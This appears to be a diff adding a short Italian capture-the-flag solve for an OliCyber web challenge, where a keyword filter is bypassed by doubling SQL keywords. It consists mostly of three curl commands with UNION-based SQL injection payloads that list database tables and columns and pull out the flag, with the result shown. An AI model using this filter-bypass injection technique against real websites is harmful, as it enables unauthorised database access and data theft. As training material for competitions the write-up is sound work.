@@ -1,0 +1,21 @@
+il codice contiene una semplice pulizia delle parole chiava 
+quindi se toglie SELECT ad esmepio rimpiazzandolo così "" posso fare SELSELECTECT
+
+
+mi serve trovare la table e la colonna
+
+curl -s -X POST http://no-time.challs.olicyber.it/ \
+     -d "email=a@b.com' UNIUNIONON SELSELECTECT table_name FRFROMOM information_schema.tables WHEWHERERE table_schema=database() AND table_name != 'emails'%23" \
+     | grep "La mail"
+
+table = qua_trovi_la_tua_flag
+
+
+colonnna  curl -s -X POST http://no-time.challs.olicyber.it/ \
+     -d "email=a@b.com' UNIUNIONON SELSELECTECT column_name FRFROMOM information_schema.columns WHEWHERERE table_name='qua_trovi_la_tua_flflagag'%23" \
+     | grep "La mail"
+
+colonna: la_flag_sta_qua
+
+url -s -X POST http://no-time.challs.olicyber.it/ -d "email=a@b.com' UNIUNIONON SELSELECTECT la_flflagag_sta_qua FRFROMOM qua_trovi_la_tua_flflagag%23" | grep "La mail"
+                                La mail (flag{1_d0n7_w4n7_70_w41t_ju57_61v3_m3_fl4g!}) è già presente nel database!  
